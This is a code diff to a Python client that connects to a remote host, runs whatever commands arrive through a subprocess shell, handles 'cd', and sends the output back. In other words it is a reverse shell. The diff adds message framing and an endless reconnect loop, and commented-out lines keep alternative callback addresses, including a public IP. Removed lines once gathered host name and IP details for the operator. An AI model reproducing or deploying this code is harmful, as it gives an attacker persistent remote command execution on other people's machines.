@@ -52,27 +52,22 @@ class Client:
 
         self.socket = socket.socket()
         self.socket.connect((self.host, self.port))
-        # self.HOST_NAME = socket.gethostname()
-        # self.HOST_PRIIP = requests.get('https://api.ipify.org').text
-        # self.HOST_PUBIP = socket.gethostbyname(socket.gethostname())
-        # self.send(f"[*] Host Name : {self.HOST_NAME}\n")
-        # self.send(f"[*] Host PublicIp : {self.HOST_PRIIP}\n")
-        # self.send(f"[*] Host PrivateIp : {self.HOST_PUBIP}\n")
         while True:
-            self.commands = self.socket.recv(self.BUFF).decode(self.utf8)
+            self.commands = self.Recv()
             if len(str.encode(self.commands)) > 0:
                 if self.commands[:2] == 'cd':
                     self.Cprint("Tryed To Change Dir To " + str(self.commands[3:]))
                     try:
                         os.chdir(self.commands[3:])
                         # self.socket.send(str.encode("\n" + os.getcwd() + "> "))
-                        self.send()
+                        self.Send("")
                     except:
                         # self.socket.send(str.encode("Path Does Not Exists" + "\n" + os.getcwd() + "> "))
-                        self.send("Path Does Not Exists")
+                        self.Send("Path Does Not Exists")
                 elif self.commands == "exited":
+
                     self.socket.close()
-                    sys.exit(0)
+                    break
                 elif self.commands[:5] == 'host.':
                     pass
                 else:
@@ -81,13 +76,24 @@ class Client:
                     self.result = self.output.stdout.read() + self.output.stderr.read()
                     self.result = str(self.result, self.utf8)
                     # self.socket.send(str.encode(self.result + "\n" + os.getcwd() + "> "))
-                    self.send(self.result)
-
-    def send(self, msg):
+                    self.Send(self.result)
+    def Recv(self):
+        self.BUFF = int(self.socket.recv(self.BUFF).decode(self.utf8))
+        res = str(self.socket.recv(self.BUFF), self.utf8)
+        self.BUFF = 10240
+        return res
+    def Send(self, msg):
+        self.socket.send(str.encode(str(sys.getsizeof(msg))))
         self.socket.send(str.encode(msg + "\n" + os.getcwd() + "> "))
 
 
-# while True:
-Client('127.0.0.1', 5555)
-# Client('192.168.133.90', 5555)
+running = 0
+while True:
+    running += 1
+    try:
+        Client('127.0.0.1', 5555)
+    except Exception as e:
+        if "10061" in str(e):
+            print(f"Connection Refused {running} times")
+# Client('192.168.225.85', 5555)
 # Client('3.110.118.16', 56639)
